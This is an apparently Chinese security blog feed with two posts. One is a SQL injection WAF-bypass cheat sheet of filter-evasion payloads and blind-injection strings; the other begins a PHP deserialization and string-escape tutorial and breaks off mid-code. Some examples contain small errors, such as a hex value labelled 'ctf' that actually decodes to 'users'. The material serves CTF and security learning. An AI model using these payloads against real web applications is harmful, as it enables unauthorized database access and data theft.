    <content type="html"><![CDATA[<p><a name="grCSa"></a></p><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p><a name="a898fd9e"></a></p><h3 id="使用注释符-绕过"><a href="#使用注释符-绕过" class="headerlink" title="使用注释符&#x2F;**&#x2F;绕过"></a>使用注释符&#x2F;**&#x2F;绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>name<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><br></code></pre></td></tr></table></figure><p><a name="1a6aa243"></a></p><h3 id="使用url编码绕过"><a href="#使用url编码绕过" class="headerlink" title="使用url编码绕过"></a>使用url编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plsql">%0a空格的url编码<br></code></pre></td></tr></table></figure><p><a name="e3493b77"></a></p><h3 id="使用浮点数绕过"><a href="#使用浮点数绕过" class="headerlink" title="使用浮点数绕过"></a>使用浮点数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select * from users where id=8E0union select 1,2,3<br>等价于<br>select * from users where id=8.0 union select 1,2,3<br></code></pre></td></tr></table></figure><p><a name="38cabe68"></a></p><h3 id="使用NULL值绕过"><a href="#使用NULL值绕过" class="headerlink" title="使用NULL值绕过"></a>使用NULL值绕过</h3><p>\N表示空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select * from users where id=\Nunion select 1,2,3;<br>等价于<br>select * from users where id=1 union select 1,2,3;<br></code></pre></td></tr></table></figure><p><a name="UAJE4"></a></p><h3 id="使用两个空格替代一个空格，使用Tab替代空格"><a href="#使用两个空格替代一个空格，使用Tab替代空格" class="headerlink" title="使用两个空格替代一个空格，使用Tab替代空格"></a>使用两个空格替代一个空格，使用Tab替代空格</h3><p><a name="TO9I0"></a></p><h3 id="使用括号绕过"><a href="#使用括号绕过" class="headerlink" title="使用括号绕过"></a>使用括号绕过</h3><p>括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select(user())from ctf where(1=1)and(2=2)<br>时间盲注的情况下比较常见<br>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))--+<br></code></pre></td></tr></table></figure><p><a name="Lk7U1"></a></p><h1 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h1><p><a name="zOtNV"></a></p><h3 id="使用16进制绕过"><a href="#使用16进制绕过" class="headerlink" title="使用16进制绕过"></a>使用16进制绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select column_name  from information_schema.tables where table_name=&quot;ctf&quot;<br>将ctf用16进制表示之后<br>select column_name  from information_schema.tables where table_name=0x7573657273<br></code></pre></td></tr></table></figure><p><a name="gn0US"></a></p><h1 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h1><p><a name="EGndd"></a></p><h3 id="使用from语句绕过"><a href="#使用from语句绕过" class="headerlink" title="使用from语句绕过"></a>使用from语句绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br></code></pre></td></tr></table></figure><p><a name="Tq4EU"></a></p><h3 id="使用join绕过"><a href="#使用join绕过" class="headerlink" title="使用join绕过"></a>使用join绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">union select 1,2<br>等价于<br>union select * from (select 1)a join (select 2)b<br></code></pre></td></tr></table></figure><p><a name="P87OL"></a></p><h3 id="使用like绕过"><a href="#使用like绕过" class="headerlink" title="使用like绕过"></a>使用like绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select ascii(mid(user(),1,1))=80   <br>等价于<br>select user() like &#x27;r%&#x27;<br></code></pre></td></tr></table></figure><p>%类似于一个通配符</p><p><a name="IcHK7"></a></p><h3 id="使用offset绕过"><a href="#使用offset绕过" class="headerlink" title="使用offset绕过"></a>使用offset绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plsql">select * from news limit 0,1<br>等价于<br>select * from news limit 1 offset 0<br></code></pre></td></tr></table></figure><p><a name="joIj3"></a></p><h1 id="过滤注释符"><a href="#过滤注释符" class="headerlink" title="过滤注释符"></a>过滤注释符</h1><p><a name="OftuQ"></a></p><h3 id="过滤注释符绕过"><a href="#过滤注释符绕过" class="headerlink" title="过滤注释符绕过"></a>过滤注释符绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--+   #   %23   --%20</span><br></code></pre></td></tr></table></figure><p>绕过方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><a name="ddN0S"></a></p><h1 id="过滤等号"><a href="#过滤等号" class="headerlink" title="过滤等号"></a>过滤等号</h1><p><strong>使用like 、rlike 、regexp</strong><br><a name="YDmsO"></a></p><h1 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="headerlink" title="过滤or and xor not"></a>过滤or and xor not</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plsql">and=&#x27;&amp;&amp;&#x27;  <br>or=&#x27;||&#x27;   <br>xor=&#x27;|&#x27;   <br>not=&#x27;!&#x27; //感叹号<br></code></pre></td></tr></table></figure><p><a name="lfwQS"></a></p><h1 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union select"></a>过滤union select</h1><p><a name="CRXda"></a></p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plsql">id=1&#x27; UniON sElect<br></code></pre></td></tr></table></figure><p><a name="DHhc5"></a></p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>MySQL会执行放在&#x2F;!…&#x2F;中的语句。例如：<code>/*!select*/*/*!from*/users;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plsql">id=-1&#x27; /*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*!information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#<br></code></pre></td></tr></table></figure><p><a name="oXikH"></a></p><h3 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plsql">id=-1&#x27; union selselectect 1,2,3–-+<br></code></pre></td></tr></table></figure><p><a name="WHUPX"></a></p><h3 id="双重URL编码绕过"><a href="#双重URL编码绕过" class="headerlink" title="双重URL编码绕过"></a>双重URL编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union ses%<span class="hljs-number">256</span>cect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">database</span>()<br></code></pre></td></tr></table></figure><p>通过将select进行双重编码绕过了select关键字过滤，获取了数据库的信息<br><a name="6503d8e2"></a></p><h3 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">MySQL数据库可以识别十六进制,会对十六进制的数据进行自动转换<br> <br>    <br>---&gt;【dvwa-medium-sql】<br>id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables where table_gchema=<span class="hljs-number">0x6374667377696b69</span><br></code></pre></td></tr></table></figure><p><a name="3e3ac001"></a></p><h3 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">IIS中间件可以识别Unicode字符,当URL中存在Unicode字符时,IIS中间件会自动对Unicode字符进行转换<br>    <br>---&gt;SqlServer数据库<br>  id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt; (se<span class="hljs-variable">$u006cect</span> top <span class="hljs-number">1</span> name <span class="hljs-keyword">from</span> sec.dbo.sysobjects where xtype=<span class="hljs-string">&#x27;U&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a name="1c927fa4"></a></p><h3 id="ASCII编码绕过"><a href="#ASCII编码绕过" class="headerlink" title="ASCII编码绕过"></a>ASCII编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SQL Server数据库的char函数可以将字符转换为ASCII码,这样也可以绕过单引号转义的情况。<br></code></pre></td></tr></table></figure><p><a name="h0F2J"></a></p><h1 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">可以用以下等价函数代替来绕过过滤:<br><span class="hljs-number">1</span>、sleep函数可以用benchmark函数代替<br><span class="hljs-number">2</span>、ascii函数可以用hex, bin函数代替<br><span class="hljs-number">3</span>、group_concat函数可以用concat_ws函数代替<br><span class="hljs-number">4</span>、updatexml函数可以用extractvalue函数代替<br></code></pre></td></tr></table></figure><p><a name="VbZ6k"></a></p><h1 id="绕过information"><a href="#绕过information" class="headerlink" title="绕过information"></a>绕过information</h1><p><a name="028fe7c5"></a></p><h4 id="InnoDb引擎"><a href="#InnoDb引擎" class="headerlink" title="InnoDb引擎"></a>InnoDb引擎</h4><p>而在MYSQL5.6以上的版本中，inndb增加了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两张表（mysql.innodb_table_stats），这两张表中都存储了数据库和其数据表的信息，但是没有存储列名<br><a name="FqyJh"></a></p><h4 id="sys数据库"><a href="#sys数据库" class="headerlink" title="sys数据库"></a>sys数据库</h4><p>在5.7以上的MYSQL中，新增了sys数据库。可以通过其中的<code>schema_auto_increment_columns</code><br>（sys.schema_auto_increment_columns）来获取表名。</p><p>但是上述两种方法都只能查出表名，无法查到列名，这时我们就要用到无列名注入<br><a name="I2Mn0"></a></p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a name="O7Io4"></a></p><h4 id="无列名注入原理"><a href="#无列名注入原理" class="headerlink" title="无列名注入原理"></a>无列名注入原理</h4><p>无列名注入的原理就是联合查询创建虚拟数据。可以看作将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以查询字段数一定要相同，如果我们查询的字段多于数据表中列的时候，就会出现报错<br><a name="R0igr"></a></p><h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><p>正常查users表的数据是<code>select * from users;</code><br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724400806201-46441eee-2fc6-445a-8b91-d679c4a49770.png"><br>如果你的查询语句是 <code>select 1,2,3 union select * from users where id=1;</code><br>mysql数据库就会生成一个虚拟的表<br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724401014574-7804b698-4d76-427e-ba70-db7e6c649318.png"><br>那么就可以将查询的列改成1，2，3<br>使用语句<code>select </code>2<code> from (select 1,2,3 union select * from users where id=1)a;</code><br>这条sql语句在联合查询创建虚拟表a，在创建虚拟列1,2,3的同时查询虚拟表第二列的数据<br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724401215548-23db710c-f7ea-4d0d-9365-c4ceaf03c4ca.png"><br>差多列的时候 <code>select group_concat(</code>1<code>,</code>2<code>) from (select 1,2,3 union select * from users where id=1)a;</code><br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724401413128-77f5e455-9694-49e9-829b-562b1469d770.png"><br>如果反引号被ban了，可以使用如下语句<br><code>select 1 as a,2 as b,3 as c union select * from users where id=1;</code>看下效果<br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724401564878-6c19d495-5821-4177-8f24-2b564debc780.png"><br>接下来查询语句就变成了<br><code>select b from(select 1 as a,2 as b,3 as c union select * from users where id=1)a;</code><br>不过多演示<br><a name="MpKmz"></a></p><h4 id="join无列明注入"><a href="#join无列明注入" class="headerlink" title="join无列明注入"></a>join无列明注入</h4><p>通过JOIN建立两个表之间的内连接，也就是说将两张表的列名给加起来，可能会爆出相同的列的名字，我们利用的就是这个特性来爆出列名，比如<br><code>select * from (select * from users as a join users as b)a;</code><br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724401887391-16601555-b53a-410b-8a50-c7603e0116b8.png"><br>现在得到了第一个列名，那么用接下来这个语句来爆出第二个<br><code>select * from (select * from users as a join users as b using(id))a;</code><br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724402044636-8637d63e-6b22-496b-af66-4771c078f327.png"><br>然后在爆出第三个，以此类推<br><code>select * from (select * from users as a join users as b using(id,username))a;</code><br><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1724402086401-ce87a813-dbb8-4bfe-958b-52f5f45efcbf.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web技术总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化（一）</title>
    <link href="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><a name="HYcX5"></a></p><h2 id="序列化之后的格式"><a href="#序列化之后的格式" class="headerlink" title="序列化之后的格式"></a>序列化之后的格式</h2><p><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p><p>注意的是private和protected成员的序列化会有所不同如下例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pub</span> = <span class="hljs-string">&#x27;benben&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;asd&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jineng</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;pub;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/2.png"><br>里面的空字符url编码是%00</p><p>各种类型的标识</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a - array<br>b - boolean<br>d - double<br>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure><p><a name="ftUJU"></a></p><h2 id="常见魔术方法"><a href="#常见魔术方法" class="headerlink" title="常见魔术方法"></a>常见魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__wakeup</span>()， <span class="hljs-title function_ invoke__">unserialize</span>() 执行前调用<br><span class="hljs-title function_ invoke__">__destruct</span>()， 对象销毁的时候调用<br><span class="hljs-title function_ invoke__">__toString</span>()， 类被当成字符串时的回应方法<br><span class="hljs-title function_ invoke__">__construct</span>()，当对象创建(<span class="hljs-keyword">new</span>)时会自动调用，注意在<span class="hljs-title function_ invoke__">unserialize</span>()时并不会自动调用<br><span class="hljs-title function_ invoke__">__sleep</span>()，<span class="hljs-title function_ invoke__">serialize</span>()时会先被调用，<span class="hljs-title function_ invoke__">__sleep</span>()先执行再序列化<br><span class="hljs-title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><span class="hljs-title function_ invoke__">__get</span>()，调用一个不存在的成员变量触发<br><span class="hljs-title function_ invoke__">__set</span>()，设置一个不存在的或者不可访问的类的成员变量时调用<br><span class="hljs-title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()时调用<br><span class="hljs-title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="hljs-keyword">unset</span>()时被调用。<br><span class="hljs-title function_ invoke__">__wakeup</span>()，执行<span class="hljs-title function_ invoke__">unserialize</span>()时，先会调用这个函数<br><span class="hljs-title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法<br><span class="hljs-title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><span class="hljs-title function_ invoke__">__set_state</span>()，调用<span class="hljs-title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-title function_ invoke__">__clone</span>()，当对象复制完成时调用<br><span class="hljs-title function_ invoke__">__autoload</span>()，尝试加载未定义的类<br><span class="hljs-title function_ invoke__">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></table></figure><p><a name="vs22C"></a></p><h3 id="1-call"><a href="#1-call" class="headerlink" title="1.__call( )"></a>1.__call( )</h3><p>假设<code>test</code>方法未定义，那么<code>test</code>这个方法名就会作为<code>__call</code>的第一个参数传入，而<code>test</code>的参数会被装进<font color="red">数组</font>中作为<code>__call</code>的第二个参数传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">google</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>       <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parameters</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$google</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">google</span>();<br><span class="hljs-variable">$keyword</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;poc&quot;</span>=&gt;<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-variable">$keyword</span>);<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">operate</span>(<span class="hljs-variable">$keyword</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：<br><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/7.png"><br><a name="MOtd4"></a></p><h3 id="2-get"><a href="#2-get" class="headerlink" title="2.__get( )"></a>2.__get( )</h3><p>把不存在的成员属性的名称赋值给参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aa</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$b</span>-&gt;p;<br><span class="hljs-meta">?&gt;</span><br>结果就是输出<br>p<br></code></pre></td></tr></table></figure><p><a name="PnHe4"></a></p><h3 id="3-set"><a href="#3-set" class="headerlink" title="3.__set( )"></a>3.__set( )</h3><p>把调用的属性名称赋值给第一个参数，属性的值赋值给第二个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotExists</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span> . <span class="hljs-string">&#x27;-----&#x27;</span> . <span class="hljs-variable">$c</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ne</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotExists</span>();<br><span class="hljs-variable">$ne</span>-&gt;libai = <span class="hljs-string">&#x27;xiaoba&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>输出结果为：<br>libai-----xiaoba<br></code></pre></td></tr></table></figure><p><a name="q6FNP"></a></p><h3 id="4-wake-绕过的版本限制"><a href="#4-wake-绕过的版本限制" class="headerlink" title="4.__wake()绕过的版本限制"></a>4.__wake()绕过的版本限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php7:&lt;<span class="hljs-number">7.0</span>.<span class="hljs-number">10</span><br>php5:&lt;<span class="hljs-number">5.6</span>.<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>在序列化后的字符串后面加任意字符并不影响反序列化后的输出<br>1.在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。（反序列化的过程就是碰到 ;} 与最前面的 { 配对后，便停止反序列化。）<br>2.字符串的读取长度是由变量数据类型后面的数字决定的<br>例如：;s:20:<code>&quot;</code>hk”;s:4:”pass”;s:41:<code>&quot;</code> 读取到的字符串是用行内代码标识的双引号内的字符串，实际应用中可以利用这个来修改后面的字符串达到漏洞的利用<br><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/3.png"><br><a name="swLEB"></a></p><h3 id="减少形实例（增长性类比就好）"><a href="#减少形实例（增长性类比就好）" class="headerlink" title="减少形实例（增长性类比就好）"></a>减少形实例（增长性类比就好）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>    <span class="hljs-variable">$safe</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-variable">$name</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$safe</span>,<span class="hljs-string">&quot;hk&quot;</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$vip</span> = <span class="hljs-literal">false</span> ;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>&#125;<br><span 